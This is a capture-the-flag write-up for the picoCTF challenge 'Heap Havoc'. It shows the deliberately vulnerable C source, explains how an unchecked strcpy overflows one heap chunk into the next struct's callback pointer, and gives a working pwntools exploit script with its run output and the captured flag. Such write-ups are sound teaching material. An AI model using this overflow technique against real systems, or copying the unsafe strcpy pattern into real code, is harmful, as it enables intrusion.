# Writeup: Heap Havoc

## Introduction

This challenge has us overflow a few buffers in structs allocated on the heap through the strcpy function. The program works by having the user pass two names to it and determine if there are winners. The struct has an integer, a char pointer, and a void pointer. In the code we can see that there is a winner function that automatically prints out the flag. We can also see that the callback void pointer is called like a function later on in the code, so in order to call the winner function we should set the callback void pointer to the address of the winner function. Below is the source code for context.

```
    #include <stdlib.h>
    #include <unistd.h>
    #include <string.h>
    #include <stdio.h>
    #include <sys/types.h>
    #include <time.h>
    struct internet {
        int priority;
        char *name;
        void (*callback)();
    };
    void winner() {
        FILE *fp;
        char flag[256];
        fp = fopen("flag.txt", "r");
        if (fp == NULL) {
            perror("Error opening flag.txt");
            exit(1);
        }
        if (fgets(flag, sizeof(flag), fp) != NULL) {
            printf("FLAG: %s\n", flag);
        } else {
            printf("Error reading flag\n");
        }
        fclose(fp);
    }

    int main(int argc, char **argv) {
        struct internet *i1, *i2, *i3;
        printf("Enter two names separated by space:\n");
        fflush(stdout);
        if (argc != 3) {
            printf("Usage: ./vuln <name1> <name2>\n", argv[0]);
            fflush(stdout);
            return 1;
        }
    i1 = malloc(sizeof(struct internet));
    i1->priority = 1;
    i1->name = malloc(8);
    i1->callback = NULL;
    i2 = malloc(sizeof(struct internet));
    i2->priority = 2;
    i2->name = malloc(8);
    i2->callback = NULL;
    strcpy(i1->name, argv[1]);
    strcpy(i2->name, argv[2]);
    if (i1->callback) i1->callback();
    if (i2->callback) i2->callback();
        printf("No winners this time, try again!\n");
    }
```

You can see that i1 and i2 variables are initialized one after the other. On the heap this will look something like this.

```
    [i1 struct chunk]   header(8) | priority(4) | name ptr(4) | callback(4)
    [i1->name chunk]    header(8) | AAAAAAAA (8 bytes)         ← overflow starts here
    [i2 struct chunk]   header(8) | priority(4) | name ptr(4) | callback(4)

```
Since this is a 32 bit binary each struct is divided into 4 byte chunks. Each name pointer has 8 bytes allocated to it and each block of memory allocated on the heap has an 8 byte header. The struct is allocated first then the name is allocated and then the second struct. That means that from the name pointer we have 8 (name1) + 8 (header) + 4 (priority) + 4 (name2) or a 24 byte offset from name1 to the callback function. However, we cannot just overwrite the name pointer. The name pointer is used with strcpy so if there is junk in there the program will exit before the program has a chance to call the callback function for i2. So we will write a real address to it that exists in the binary, in this case the address of the bss section. This means that we need 20 bytes of padding, the bss address, and the address of the winner function.

## Results

With our strategy laid out all we have to do now is to write and deploy the script.

```
    from pwn import *

    p = remote('foggy-cliff.picoctf.net', 64519)
    e = ELF('./vuln')

    winner_addr = 0x80492b6
    padding = b'A' * 20
    payload = padding + p32(e.bss()) + p32(winner_addr)
    p.recvuntil(b':\n')
    p.sendline(payload + b' name')

    p.interactive()
```

Now we run it.

```
    [+] Opening connection to foggy-cliff.picoctf.net on port 64519: Done
    [*] '/mnt/c/Users/18506/Desktop/CTF/Heap Havoc/vuln'
        Arch:     i386-32-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x8048000)
    [*] Switching to interactive mode
    Enter two names separated by space:
    FLAG: picoCTF{h34p_0v3rfl0w_7bb56fe9}
    No winners this time, try again!
    [*] Got EOF while reading in interactive
    $
    $
    [*] Closed connection to foggy-cliff.picoctf.net port 64519
    [*] Got EOF while sending in interactive
```

Finally, we have the flag.

`picoCTF{h34p_0v3rfl0w_7bb56fe9}`

